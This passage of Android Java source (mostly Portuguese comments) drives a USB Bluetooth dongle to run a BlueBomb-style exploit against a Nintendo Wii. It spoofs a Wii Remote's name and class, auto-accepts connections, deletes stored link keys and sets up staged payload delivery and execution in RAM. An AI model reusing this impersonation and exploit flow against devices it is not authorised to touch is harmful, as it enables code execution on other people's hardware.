                releaseStartButton.setImageResource(R.drawable.start_button_active);
                releaseStartButton.setEnabled(true);
            }
        });
    }

    private void setReleaseStatus(String status) {
        if (isDebugBuild()) return;
        runOnUiThread(() -> {
            if (releaseStatusView != null) releaseStatusView.setText(status);
        });
    }

    private void scheduleReleaseNoConnectionHint() {
        if (isDebugBuild()) return;
        final long startedAt = System.currentTimeMillis();
        new Thread(() -> {
            try { Thread.sleep(26000); } catch (InterruptedException ignored) { return; }
            if (activeConnectionHandle < 0 && pendingStartAfterDongleOpen == false) {
                log("Still waiting for the Wii. Press SYNC again.");
            }
            try { Thread.sleep(34000); } catch (InterruptedException ignored) { return; }
            if (activeConnectionHandle < 0 && System.currentTimeMillis() - startedAt >= 55000) {
                log("WARNING: no Wii connection was detected. Restart the app and try again.");
            }
        }, "release-connect-timeout").start();
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density + 0.5f);
    }

    private void registerUsbPermissionReceiver() {
        IntentFilter filter = new IntentFilter(ACTION_USB_PERMISSION);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(usbPermissionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(usbPermissionReceiver, filter);
        }
    }

    private UsbDevice getUsbDeviceExtra(Intent intent) {
        if (intent == null) return null;
        if (Build.VERSION.SDK_INT >= 33) {
            return intent.getParcelableExtra(UsbManager.EXTRA_DEVICE, UsbDevice.class);
        }
        @SuppressWarnings("deprecation")
        UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
        return device;
    }

    private void listUsbDevices() {
        Map<String, UsbDevice> devices = usbManager.getDeviceList();
        if (devices.isEmpty()) {
            log("No USB devices found. Check OTG, power, and whether the dongle LED is on.");
            return;
        }

        log("Dispositivos USB encontrados: " + devices.size());
        for (UsbDevice device : devices.values()) {
            log("- " + describeDevice(device));
            for (int i = 0; i < device.getInterfaceCount(); i++) {
                UsbInterface intf = device.getInterface(i);
                log(String.format(Locale.US,
                        "  Interface %d: id=%d class=0x%02X sub=0x%02X proto=0x%02X endpoints=%d%s",
                        i,
                        intf.getId(),
                        intf.getInterfaceClass(),
                        intf.getInterfaceSubclass(),
                        intf.getInterfaceProtocol(),
                        intf.getEndpointCount(),
                        isBluetoothHciInterface(intf) ? "  <-- candidato BT/HCI" : ""));
                for (int e = 0; e < intf.getEndpointCount(); e++) {
                    UsbEndpoint ep = intf.getEndpoint(e);
                    log(String.format(Locale.US,
                            "    EP %d: addr=0x%02X dir=%s type=%s maxPacket=%d interval=%d",
                            e,
                            ep.getAddress(),
                            epDirectionName(ep),
                            epTypeName(ep),
                            ep.getMaxPacketSize(),
                            ep.getInterval()));
                }
            }
        }
    }

    private void requestOpenFirstBluetoothDongle() {
        UsbDevice device = findFirstBluetoothDongle();
        if (device == null) {
            log("No compatible USB Bluetooth HCI dongle was found.");
            log("Look for interface class=0xE0 subclass=0x01 protocol=0x01 in the log.");
            return;
        }
        requestOpenSpecificDevice(device);
    }

    private void requestOpenSpecificDevice(UsbDevice device) {
        if (device == null) return;
        selectedDevice = device;
        if (usbManager.hasPermission(device)) {
            log("USB permission already granted for " + shortDeviceName(device) + ". Opening...");
            openDevice(device);
            return;
        }

        Intent intent = new Intent(ACTION_USB_PERMISSION).setPackage(getPackageName());
        int flags = PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, flags);
        log("Requesting USB permission for " + shortDeviceName(device) + "...");
        usbManager.requestPermission(device, pi);
    }

    private UsbDevice findFirstBluetoothDongle() {
        for (UsbDevice device : usbManager.getDeviceList().values()) {
            for (int i = 0; i < device.getInterfaceCount(); i++) {
                if (isBluetoothHciInterface(device.getInterface(i))) {
                    return device;
                }
            }
        }
        return null;
    }

    private boolean isBluetoothHciInterface(UsbInterface intf) {
        return intf.getInterfaceClass() == USB_CLASS_WIRELESS_CONTROLLER
                && intf.getInterfaceSubclass() == USB_SUBCLASS_RF_CONTROLLER
                && intf.getInterfaceProtocol() == USB_PROTOCOL_BLUETOOTH;
    }

    private void openDevice(UsbDevice device) {
        closeCurrentConnection();

        UsbInterface foundInterface = null;
        for (int i = 0; i < device.getInterfaceCount(); i++) {
            UsbInterface intf = device.getInterface(i);
            if (isBluetoothHciInterface(intf)) {
                foundInterface = intf;
                break;
            }
        }

        if (foundInterface == null) {
            log("ERROR: device has no standard BT/HCI interface.");
            return;
        }

        UsbDeviceConnection conn = usbManager.openDevice(device);
        if (conn == null) {
            log("ERROR: openDevice returned null. Permission denied or dongle unavailable.");
            return;
        }

        boolean claimed = conn.claimInterface(foundInterface, true);
        if (!claimed) {
            log("ERROR: could not claim the interface. Android/system may be holding this dongle.");
            conn.close();
            return;
        }

        connection = conn;
        selectedDevice = device;
        hciInterface = foundInterface;
        eventInEndpoint = null;
        aclInEndpoint = null;
        aclOutEndpoint = null;

        for (int e = 0; e < hciInterface.getEndpointCount(); e++) {
            UsbEndpoint ep = hciInterface.getEndpoint(e);
            boolean in = (ep.getDirection() == UsbConstants.USB_DIR_IN);
            boolean out = (ep.getDirection() == UsbConstants.USB_DIR_OUT);
            if (ep.getType() == UsbConstants.USB_ENDPOINT_XFER_INT && in) {
                eventInEndpoint = ep;
            } else if (ep.getType() == UsbConstants.USB_ENDPOINT_XFER_BULK && in) {
                aclInEndpoint = ep;
            } else if (ep.getType() == UsbConstants.USB_ENDPOINT_XFER_BULK && out) {
                aclOutEndpoint = ep;
            }
        }

        log("Dongle aberto: " + describeDevice(device));
        log("Interface HCI claimada: id=" + hciInterface.getId());
        log("Event IN: " + endpointSummary(eventInEndpoint));
        log("ACL IN:   " + endpointSummary(aclInEndpoint));
        log("ACL OUT:  " + endpointSummary(aclOutEndpoint));
        activeConnectionHandle = -1;
        activeRemoteBdAddr = null;

        if (eventInEndpoint == null) {
            log("WARNING: missing interrupt IN endpoint. HCI events cannot be read.");
        }
        if (aclInEndpoint == null || aclOutEndpoint == null) {
            log("WARNING: incomplete ACL bulk endpoints. L2CAP will not work.");
        }

        continuePendingStartAfterDongleOpen();
    }

    private void closeCurrentConnection() {
        stopMonitors();
        if (connection != null) {
            try {
                if (hciInterface != null) connection.releaseInterface(hciInterface);
            } catch (Exception ignored) {
            }
            try {
                connection.close();
            } catch (Exception ignored) {
            }
        }
        connection = null;
        hciInterface = null;
        eventInEndpoint = null;
        aclInEndpoint = null;
        aclOutEndpoint = null;
    }

    private void runHciReset() {
        runInWorker(() -> {
            HciResponse response = sendHciCommandAndWait(HCI_RESET, new byte[0], 4000);
            if (response == null) return;
            log("HCI_Reset: " + response.summary());
            if (response.isCommandCompleteFor(HCI_RESET)) {
                log("Status: " + hciStatusName(response.statusByte()));
            }
        });
    }

    private void runReadLocalVersion() {
        runInWorker(() -> {
            HciResponse response = sendHciCommandAndWait(HCI_READ_LOCAL_VERSION, new byte[0], 4000);
            if (response == null) return;
            log("Read_Local_Version_Information: " + response.summary());
            if (response.isCommandCompleteFor(HCI_READ_LOCAL_VERSION)) {
                int status = response.statusByte();
                log("Status: " + hciStatusName(status));
                if (status == 0 && response.event.length >= 14) {
                    int hciVersion = u8(response.event[6]);
                    int hciRevision = le16(response.event, 7);
                    int lmpPalVersion = u8(response.event[9]);
                    int manufacturer = le16(response.event, 10);
                    int lmpPalSubversion = le16(response.event, 12);
                    log(String.format(Locale.US,
                            "Versão: HCI=%d rev=0x%04X LMP/PAL=%d manufacturer=0x%04X subversion=0x%04X",
                            hciVersion,
                            hciRevision,
                            lmpPalVersion,
                            manufacturer,
                            lmpPalSubversion));
                }
            }
        });
    }

    private void runReadBdAddr() {
        runInWorker(() -> {
            HciResponse response = sendHciCommandAndWait(HCI_READ_BD_ADDR, new byte[0], 4000);
            if (response == null) return;
            log("Read_BD_ADDR: " + response.summary());
            if (response.isCommandCompleteFor(HCI_READ_BD_ADDR)) {
                int status = response.statusByte();
                log("Status: " + hciStatusName(status));
                if (status == 0 && response.event.length >= 12) {
                    byte[] addr = Arrays.copyOfRange(response.event, 6, 12);
                    log("BD_ADDR: " + formatBdAddr(addr));
                }
            }
        });
    }

    private void runSetWiiLikeName() {
        runInWorker(() -> {
            byte[] params = new byte[248];
            byte[] name = "Nintendo RVL-CNT-01".getBytes(StandardCharsets.US_ASCII);
            System.arraycopy(name, 0, params, 0, Math.min(name.length, params.length));
            HciResponse response = sendHciCommandAndWait(HCI_WRITE_LOCAL_NAME, params, 4000);
            if (response == null) return;
            log("Write_Local_Name Nintendo RVL-CNT-01: " + response.summary());
            if (response.isCommandCompleteFor(HCI_WRITE_LOCAL_NAME)) {
                log("Status: " + hciStatusName(response.statusByte()));
            }
        });
    }

    private void runEnableScan() {
        runInWorker(() -> {
            // 0x03 = Inquiry Scan + Page Scan. Equivale a deixar visível e conectável no nível HCI clássico.
            HciResponse response = sendHciCommandAndWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x03}, 4000);
            if (response == null) return;
            log("Write_Scan_Enable 0x03: " + response.summary());
            if (response.isCommandCompleteFor(HCI_WRITE_SCAN_ENABLE)) {
                log("Status: " + hciStatusName(response.statusByte()));
            }
        });
    }


    private void runWriteWiimoteLikeClass() {
        runInWorker(() -> {
            // Class of Device often reported for Wii Remote-like peripherals: 0x002504.
            // HCI sends the 3 octets least-significant first: 04 25 00.
            HciResponse response = sendHciCommandAndWait(HCI_WRITE_CLASS_OF_DEVICE, new byte[]{0x04, 0x25, 0x00}, 4000);
            if (response == null) return;
            log("Write_Class_Of_Device 0x002504: " + response.summary());
            if (response.isCommandCompleteFor(HCI_WRITE_CLASS_OF_DEVICE)) {
                log("Status: " + hciStatusName(response.statusByte()));
            }
        });
    }


    private void runSetClassicEventMask() {
        runInWorker(() -> {
            // HCI Set_Event_Mask: habilita eventos clássicos importantes como
            // Connection Request, Connection Complete, PIN Code Request e Link Key Request.
            byte[] mask = new byte[]{
                    (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
                    (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x3F
            };
            HciResponse response = sendHciCommandAndWait(HCI_SET_EVENT_MASK, mask, 4000);
            if (response == null) return;
            log("Set_Event_Mask clássico: " + response.summary());
            if (response.isCommandCompleteFor(HCI_SET_EVENT_MASK)) {
                log("Status: " + hciStatusName(response.statusByte()));
            }
        });
    }

    private void runSetLimitedIacLap() {
        runInWorker(() -> {
            HciResponse response = sendSetLimitedIacLap();
            if (response != null) {
                log("Write_Current_IAC_LAP LIAC: " + response.summary());
                if (response.isCommandCompleteFor(HCI_WRITE_CURRENT_IAC_LAP)) {
                    log("Status: " + hciStatusName(response.statusByte()));
                }
            }
        });
    }

    private HciResponse sendSetLimitedIacLap() {
        // BlueBomb Linux usa LAP 0x9E8B00 (Limited Inquiry Access Code).
        // No HCI USB, LAP vai em little-endian com 3 octetos: 00 8B 9E.
        byte[] params = new byte[]{0x01, 0x00, (byte) 0x8B, (byte) 0x9E};
        return sendHciCommandAndWait(HCI_WRITE_CURRENT_IAC_LAP, params, 4000);
    }

    private HciResponse sendSetDualIacLap() {
        // v0.3: adiciona também GIAC 0x9E8B33.
        // A ideia é manter compatibilidade com o Wii (LIAC) e permitir teste de visibilidade geral.
        // Formato: Num_Current_IAC, LIAC(00 8B 9E), GIAC(33 8B 9E).
        byte[] params = new byte[]{0x02, 0x00, (byte) 0x8B, (byte) 0x9E, 0x33, (byte) 0x8B, (byte) 0x9E};
        return sendHciCommandAndWait(HCI_WRITE_CURRENT_IAC_LAP, params, 4000);
    }

    private HciResponse sendSetGeneralIacLap() {
        // GIAC 0x9E8B33: útil para teste com PC/Dolphin e scanners Bluetooth comuns.
        byte[] params = new byte[]{0x01, 0x33, (byte) 0x8B, (byte) 0x9E};
        return sendHciCommandAndWait(HCI_WRITE_CURRENT_IAC_LAP, params, 4000);
    }

    private void runSetDualIacLap() {
        runInWorker(() -> {
            HciResponse response = sendSetDualIacLap();
            if (response != null) {
                log("Write_Current_IAC_LAP LIAC+GIAC: " + response.summary());
                if (response.isCommandCompleteFor(HCI_WRITE_CURRENT_IAC_LAP)) {
                    log("Status: " + hciStatusName(response.statusByte()));
                }
            }
        });
    }

    private void runReadControllerState() {
        runInWorker(() -> readControllerState("Read Estado manual"));
    }

    private void readControllerState(String label) {
        log("===== " + label + " =====");

        HciResponse scan = sendHciCommandAndWait(HCI_READ_SCAN_ENABLE, new byte[0], 4000);
        if (scan != null) {
            log("Read_Scan_Enable: " + scan.shortName());
            if (scan.isCommandCompleteFor(HCI_READ_SCAN_ENABLE) && scan.statusByte() == 0 && scan.event.length >= 7) {
                int value = scan.event[6] & 0xFF;
                log(String.format(Locale.US, "Scan_Enable atual: 0x%02X (%s)", value,
                        value == 0x03 ? "Inquiry+Page Scan" : "valor diferente de 0x03"));
            }
        }

        HciResponse cod = sendHciCommandAndWait(HCI_READ_CLASS_OF_DEVICE, new byte[0], 4000);
        if (cod != null) {
            log("Read_Class_Of_Device: " + cod.shortName());
            if (cod.isCommandCompleteFor(HCI_READ_CLASS_OF_DEVICE) && cod.statusByte() == 0 && cod.event.length >= 9) {
                int classValue = (cod.event[6] & 0xFF) | ((cod.event[7] & 0xFF) << 8) | ((cod.event[8] & 0xFF) << 16);
                log(String.format(Locale.US, "Class_Of_Device atual: 0x%06X", classValue));
            }
        }

        HciResponse iac = sendHciCommandAndWait(HCI_READ_CURRENT_IAC_LAP, new byte[0], 4000);
        if (iac != null) {
            log("Read_Current_IAC_LAP: " + iac.shortName());
            if (iac.isCommandCompleteFor(HCI_READ_CURRENT_IAC_LAP) && iac.statusByte() == 0 && iac.event.length >= 7) {
                int count = iac.event[6] & 0xFF;
                log("IAC count atual: " + count);
                for (int n = 0; n < count; n++) {
                    int off = 7 + (n * 3);
                    if (off + 2 < iac.event.length) {
                        int lap = (iac.event[off] & 0xFF) | ((iac.event[off + 1] & 0xFF) << 8) | ((iac.event[off + 2] & 0xFF) << 16);
                        log(String.format(Locale.US, "IAC[%d]: 0x%06X", n, lap));
                    }
                }
            }
        }

        HciResponse name = sendHciCommandAndWait(HCI_READ_LOCAL_NAME, new byte[0], 4000);
        if (name != null) {
            log("Read_Local_Name: " + name.shortName());
            if (name.isCommandCompleteFor(HCI_READ_LOCAL_NAME) && name.statusByte() == 0 && name.event.length > 6) {
                int len = 0;
                for (int i = 6; i < name.event.length && name.event[i] != 0; i++) len++;
                String currentName = new String(name.event, 6, len, StandardCharsets.US_ASCII);
                log("Local_Name atual: '" + currentName + "'");
            }
        }
    }

    private void setStage0Profile(boolean paddedContinuation, long startDelayMs, long attrDelayMs, long remainderDelayMs, long haxDelayMs) {
        stage0PaddedContinuation = paddedContinuation;
        sdpStartDelayMs = startDelayMs;
        stage0AttrDelayMs = attrDelayMs;
        stage0RemainderDelayMs = remainderDelayMs;
        stage0HaxDelayMs = haxDelayMs;
        log(String.format(Locale.US,
                "Perfil Stage0: continuation=%s sdpStart=%dms attrDelay=%dms remDelay=%dms haxDelay=%dms",
                paddedContinuation ? "PADDED-COMPARE" : "BLUEBOMB-ORIG-TRUNC",
                startDelayMs, attrDelayMs, remainderDelayMs, haxDelayMs));
    }

    private void runSetupListenMode(boolean wiiMode, boolean strictContinuation, boolean useWatchdog, boolean recoveryRearm) {
        runInWorker(() -> {
            log("===== v1.0 SETUP " + (wiiMode ? (strictContinuation ? "WII STRICT / LIAC" : (recoveryRearm ? "WII BYTE REARM + AUTO-STAGE0 / LIAC" : "WII BYTE-PARITY STRICT-CONNECT + AUTO-STAGE0 / LIAC")) : "PC-DOLPHIN / GIAC") + " =====");
            stage0StrictContinuation = strictContinuation;
            if (wiiMode && !strictContinuation) {
                log("Modo byte-parity: setup quieto como STRICT; depois Stage0 continua em AUTO com formato de continuação BlueBomb original.");
            } else {
                log("Esta versão adiciona stage0 real com controle de continuação SDP " + (strictContinuation ? "STRICT" : "AUTO") + ".");
            }
            log("Envia Stage1 asset embutido, externo ou fallback benigno conforme modo. O stage1 real só é lido depois do S0/GD. Cuidado: stage1 é executado em RAM.");

            // v0.16: sempre resetar estado lógico de exploit/upload a cada setup.
            stage1UploadStarted = false;
            stage1AckCount = 0;
            haxScheduled = false;
            haxTriggered = false;
            stage0ResponseSeen = false;
            sdpProactiveSent = false;
            sdpConfigSeen = false;
            bluebombSdpFlowStarted = false;
            stage0FirstSent = false;
            stage0RemainderSent = false;
            log("Modo Stage1: " + (requireAssetStage1 ? "ASSET EMBUTIDO OBRIGATÓRIO" : (requireExternalStage1 ? "EXTERNO OBRIGATÓRIO" : "fallback benigno permitido")));

            if (connection == null || hciInterface == null) {
                UsbDevice device = findFirstBluetoothDongle();
                if (device == null) {
                    log("Nenhum dongle BT/HCI encontrado para setup.");
                    return;
                }
                if (!usbManager.hasPermission(device)) {
                    log("Ainda sem permissão USB. Use primeiro: 'Abrir dongle'.");
                    return;
                }
                openDevice(device);
            }

            sdpLocalCid = -1;
            sdpRemoteCid = -1;
            hidControlLocalCid = -1;
            hidControlRemoteCid = -1;
            hidInterruptLocalCid = -1;
            hidInterruptRemoteCid = -1;

            HciResponse reset = sendHciCommandAndWait(HCI_RESET, new byte[0], 4000);
            if (reset == null || reset.statusByte() != 0) {
                log("AVISO: HCI_Reset não confirmou sucesso. Continuando com cautela.");
            }

            if (recoveryRearm) {
                log("v1.0 REARM: limpando estado HCI antes do setup. Motivo: após jump/payload benigno, alguns testes pararam de receber Connection Request.");
                HciResponse scanOff = sendHciCommandAndWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x00}, 4000);
                if (scanOff != null) log("REARM Write_Scan_Enable 0x00: " + scanOff.shortName());
                byte[] deleteAllKeys = new byte[]{
                        (byte)0xFF, (byte)0xFF, (byte)0xFF,
                        (byte)0xFF, (byte)0xFF, (byte)0xFF,
                        0x01
                };
                HciResponse delKeys = sendHciCommandAndWait(HCI_DELETE_STORED_LINK_KEY, deleteAllKeys, 4000);
                if (delKeys != null) log("REARM Delete_Stored_Link_Key(all): " + delKeys.shortName());
                try { Thread.sleep(250); } catch (InterruptedException ignored) {}
            }

            byte[] eventMaskParams = new byte[]{
                    (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
                    (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x3F
            };
            HciResponse eventMask = sendHciCommandAndWait(HCI_SET_EVENT_MASK, eventMaskParams, 4000);
            if (eventMask != null) log("Setup Set_Event_Mask clássico: " + eventMask.shortName());

            HciResponse bd = sendHciCommandAndWait(HCI_READ_BD_ADDR, new byte[0], 4000);
            if (bd != null && bd.statusByte() == 0 && bd.event.length >= 12) {
                log("Setup BD_ADDR local: " + formatBdAddr(Arrays.copyOfRange(bd.event, 6, 12)));
            }

            byte[] nameParams = new byte[248];
            byte[] name = "Nintendo RVL-CNT-01".getBytes(StandardCharsets.US_ASCII);
            System.arraycopy(name, 0, nameParams, 0, Math.min(name.length, nameParams.length));
            HciResponse localName = sendHciCommandAndWait(HCI_WRITE_LOCAL_NAME, nameParams, 4000);
            if (localName != null) log("Setup Write_Local_Name: " + localName.shortName());

            HciResponse cod = sendHciCommandAndWait(HCI_WRITE_CLASS_OF_DEVICE, new byte[]{0x04, 0x25, 0x00}, 4000);
            if (cod != null) log("Setup Write_Class_Of_Device: " + cod.shortName());

            HciResponse iac = wiiMode ? sendSetLimitedIacLap() : sendSetGeneralIacLap();
            if (iac != null) log("Setup IAC " + (wiiMode ? "LIAC 0x9E8B00" : "GIAC 0x9E8B33") + ": " + iac.shortName());

            HciResponse scan = sendHciCommandAndWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x03}, 4000);
            if (scan != null) log("Setup Write_Scan_Enable 0x03: " + scan.shortName());

            readControllerState("Post-setup verification v1.0");

            startEventMonitor();
            startAclMonitor();

            // v0.10: NÃO usar watchdog no modo híbrido.
            // Pelo histórico do Gabriel, o Wii só conecta de forma confiável pelo caminho tipo STRICT;
            // então o modo híbrido deixa o HCI quieto depois do setup e só automatiza a continuação do Stage0 após conectar.
            if (useWatchdog) {
                startDiscoverabilityWatchdog(wiiMode);
                log("Watchdog ativo: reaplicando " + (wiiMode ? "LIAC 0x9E8B00" : "GIAC 0x9E8B33") + " + Scan_Enable enquanto não houver conexão.");
            } else if (wiiMode && !strictContinuation) {
                log(recoveryRearm ? "BYTE-REARM: setup quieto, mas farei UM rearm tardio se o Wii não conectar." : "BYTE-PARITY: sem watchdog. Agora não vou mexer mais no HCI até o Wii conectar.");
            }

            if (recoveryRearm) {
                startOneShotLateRearm(wiiMode);
            }

            log("Modo escuta ativo. Agora tente conectar pelo Wii real (SYNC). Modo continuação SDP: " + (stage0StrictContinuation ? "STRICT" : "AUTO"));
            log("Procure por: STAGE0 RESPONDEU S0, STAGE1 PAYLOAD UPLOAD, ACK GD e STAGE1 JUMP ENVIADO.");
        });
    }

    private void startEventMonitor() {
        if (connection == null || eventInEndpoint == null) {
            log("Não dá para iniciar monitor HCI: dongle/event endpoint ausente.");
            return;
        }
        if (eventMonitorRunning) {
            log("Monitor HCI Events já está ativo.");
            return;
        }
        eventMonitorRunning = true;
        eventMonitorThread = new Thread(() -> {
            log("Monitor HCI Events iniciado.");
            while (eventMonitorRunning && connection != null && eventInEndpoint != null) {
                byte[] event = readHciEvent(500);
                if (event == null) continue;
                HciResponse response = new HciResponse(event);
                log("MON EVT: " + hex(event, event.length) + "  " + response.shortName());
                processMonitorHciEvent(event);
            }
            log("Monitor HCI Events encerrado.");
        }, "hci-event-monitor");
        eventMonitorThread.start();
    }

    private void startAclMonitor() {
        if (connection == null || aclInEndpoint == null) {
            log("Não dá para iniciar monitor ACL: dongle/ACL IN ausente.");
            return;
        }
        if (aclMonitorRunning) {
            log("Monitor ACL IN já está ativo.");
            return;
        }
        aclMonitorRunning = true;
        aclMonitorThread = new Thread(() -> {
            log("Monitor ACL IN iniciado.");
            while (aclMonitorRunning && connection != null && aclInEndpoint != null) {
                byte[] acl = readAclPacket(500);
                if (acl == null) continue;
                log("ACL IN: " + hex(acl, Math.min(acl.length, 128)) + (acl.length > 128 ? " ..." : ""));
                processAclPacket(acl);
            }
            log("Monitor ACL IN encerrado.");
        }, "hci-acl-monitor");
        aclMonitorThread.start();
    }

    private void stopMonitors() {
        boolean hadAny = eventMonitorRunning || aclMonitorRunning || discoverabilityWatchdogRunning;
        eventMonitorRunning = false;
        aclMonitorRunning = false;
        discoverabilityWatchdogRunning = false;
        if (hadAny) log("Solicitado parar monitores/watchdog.");
    }


    private void startOneShotLateRearm(boolean wiiMode) {
        new Thread(() -> {
            try { Thread.sleep(18000); } catch (InterruptedException ignored) {}
            if (activeConnectionHandle >= 0) {
                log("REARM tardio cancelado: conexão HCI já ativa.");
                return;
            }
            if (!eventMonitorRunning || connection == null) {
                log("REARM tardio cancelado: monitor/conexão USB não está ativo.");
                return;
            }
            log("v1.0 late REARM: ainda sem Connection Request; rearmando Scan/IAC uma única vez.");
            sendHciCommandNoWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x00}, "LateRearm Write_Scan_Enable 0x00");
            try { Thread.sleep(250); } catch (InterruptedException ignored) {}
            byte[] iac = wiiMode
                    ? new byte[]{0x01, 0x00, (byte)0x8B, (byte)0x9E}
                    : new byte[]{0x01, 0x33, (byte)0x8B, (byte)0x9E};
            sendHciCommandNoWait(HCI_WRITE_CURRENT_IAC_LAP, iac, "LateRearm Write_Current_IAC_LAP");
            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            sendHciCommandNoWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x03}, "LateRearm Write_Scan_Enable 0x03");
            log("v1.0 late REARM complete. Press SYNC again if the Wii has not tried to connect yet.");
        }, "late-rearm-once").start();
    }

    private void startDiscoverabilityWatchdog(boolean wiiMode) {
        discoverabilityWatchdogRunning = false;
        discoverabilityWatchdogWiiMode = wiiMode;
        new Thread(() -> {
            try { Thread.sleep(2500); } catch (InterruptedException ignored) {}
            discoverabilityWatchdogRunning = true;
            log("Watchdog discoverable iniciado: modo=" + (wiiMode ? "Wii/LIAC" : "PC/GIAC") + ". Reaplica IAC+Scan enquanto não houver conexão HCI.");
            int tick = 0;
            while (discoverabilityWatchdogRunning && activeConnectionHandle < 0 && tick < 18) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                if (!discoverabilityWatchdogRunning || activeConnectionHandle >= 0) break;
                tick++;
                byte[] iac = wiiMode
                        ? new byte[]{0x01, 0x00, (byte)0x8B, (byte)0x9E}
                        : new byte[]{0x01, 0x33, (byte)0x8B, (byte)0x9E};
                log("Watchdog discoverable tick " + tick + ": reaplicando " + (wiiMode ? "LIAC 0x9E8B00" : "GIAC 0x9E8B33") + " + Scan_Enable 0x03.");
                sendHciCommandNoWait(HCI_WRITE_CURRENT_IAC_LAP, iac, "Watchdog Write_Current_IAC_LAP");
                sendHciCommandNoWait(HCI_WRITE_SCAN_ENABLE, new byte[]{0x03}, "Watchdog Write_Scan_Enable");
            }
            if (activeConnectionHandle >= 0) {
                log("Watchdog discoverable encerrado: conexão HCI ativa detectada.");
            } else if (discoverabilityWatchdogRunning) {
                log("Watchdog discoverable encerrado por limite de tempo sem conexão.");
            } else {
                log("Watchdog discoverable encerrado.");
            }
            discoverabilityWatchdogRunning = false;
        }, "discoverability-watchdog").start();
    }

    private void processMonitorHciEvent(byte[] event) {
        if (event.length < 1) return;
        int eventCode = u8(event[0]);
        switch (eventCode) {
            case 0x03: // Connection Complete
                handleConnectionComplete(event);
                break;
            case 0x04: // Connection Request
                handleConnectionRequest(event);
                break;
            case 0x05: // Disconnection Complete
                handleDisconnectionComplete(event);
                break;
            case 0x16: // PIN Code Request
                handlePinCodeRequest(event);
                break;
            case 0x17: // Link Key Request
                handleLinkKeyRequest(event);
                break;
            case 0x31: // IO Capability Request (SSP)
                log("IO Capability Request recebido. v0.2 apenas registra; se for necessário, v0.3 pode responder SSP.");
                break;
            case 0x3E: // LE Meta Event
                log("LE Meta Event recebido. Para BlueBomb/Wii clássico, normalmente não é o caminho principal.");
                break;
            default:
                break;
        }
    }

    private void handleConnectionRequest(byte[] event) {
        if (event.length < 12) {
            log("Connection Request curto demais para parsear.");
            return;
        }
        byte[] bd = Arrays.copyOfRange(event, 2, 8);
        String addr = formatBdAddr(bd);
        int cod0 = u8(event[8]);
        int cod1 = u8(event[9]);
        int cod2 = u8(event[10]);
        int linkType = u8(event[11]);
        log(String.format(Locale.US,
                "Connection Request de %s class=0x%02X%02X%02X linkType=0x%02X. Auto-accept=ON",
                addr, cod2, cod1, cod0, linkType));

        byte[] params = new byte[7];
        System.arraycopy(bd, 0, params, 0, 6);
        params[6] = 0x01; // 0x01 = remain peripheral/slave role. Combina melhor com fingir ser Wii Remote.
        sendHciCommandNoWait(HCI_ACCEPT_CONNECTION_REQUEST, params, "Accept_Connection_Request " + addr);
    }

    private void handleConnectionComplete(byte[] event) {
        if (event.length < 13) {
            log("Connection Complete curto demais para parsear.");
            return;
        }
        int status = u8(event[2]);
        int handle = le16(event, 3) & 0x0FFF;
        byte[] bd = Arrays.copyOfRange(event, 5, 11);
        String addr = formatBdAddr(bd);
        int linkType = u8(event[11]);
        int encryption = u8(event[12]);
        log(String.format(Locale.US,
                "Connection Complete status=%s handle=0x%04X remote=%s linkType=0x%02X encryption=0x%02X",
                hciStatusName(status), handle, addr, linkType, encryption));
        if (status == 0) {
            activeConnectionHandle = handle;
            activeRemoteBdAddr = addr;
            log("Conexão HCI ativa registrada. Agora o monitor ACL pode receber L2CAP.");
        }
    }

    private void handleDisconnectionComplete(byte[] event) {
        if (event.length < 6) {
            log("Disconnection Complete curto demais.");
            return;
        }
        int status = u8(event[2]);
        int handle = le16(event, 3) & 0x0FFF;
        int reason = u8(event[5]);
        log(String.format(Locale.US,
                "Disconnection Complete status=%s handle=0x%04X reason=0x%02X",
                hciStatusName(status), handle, reason));
        if (handle == activeConnectionHandle) {
            activeConnectionHandle = -1;
            activeRemoteBdAddr = null;
            sdpLocalCid = -1;
            sdpRemoteCid = -1;
            hidControlLocalCid = -1;
            hidControlRemoteCid = -1;
            hidInterruptLocalCid = -1;
            hidInterruptRemoteCid = -1;
            sdpProactiveSent = false;
            sdpConfigSeen = false;
            bluebombSdpFlowStarted = false;
            stage0FirstSent = false;
            stage0RemainderSent = false;
            haxScheduled = false;
            haxTriggered = false;
            stage0ResponseSeen = false;
            log("Conexão HCI ativa limpa.");
        }
    }

    private void handleLinkKeyRequest(byte[] event) {
        if (event.length < 8) {
            log("Link Key Request curto demais.");
            return;
        }
        byte[] bd = Arrays.copyOfRange(event, 2, 8);
        String addr = formatBdAddr(bd);
        log("Link Key Request de " + addr + ". Enviando Negative Reply para permitir tentativa sem chave salva.");
        sendHciCommandNoWait(HCI_LINK_KEY_REQUEST_NEGATIVE_REPLY, bd, "Link_Key_Request_Negative_Reply " + addr);
    }

    private void handlePinCodeRequest(byte[] event) {
        if (event.length < 8) {
            log("PIN Code Request curto demais.");
            return;
        }
        byte[] bd = Arrays.copyOfRange(event, 2, 8);
        String addr = formatBdAddr(bd);
        log("PIN Code Request de " + addr + ". v0.2 envia Negative Reply; se o Wii exigir PIN real, ajustaremos na v0.3.");
        sendHciCommandNoWait(HCI_PIN_CODE_REQUEST_NEGATIVE_REPLY, bd, "PIN_Code_Request_Negative_Reply " + addr);
    }

    private void runSendL2capInfoRequest() {
        runInWorker(() -> {
            if (activeConnectionHandle < 0) {
                log("Sem conexão HCI ativa. Espere Connection Complete antes de enviar ACL.");
                return;
            }
            byte id;
            synchronized (this) {
                id = (byte) (nextL2capIdentifier & 0xFF);
                nextL2capIdentifier++;
                if (nextL2capIdentifier > 250) nextL2capIdentifier = 1;
            }

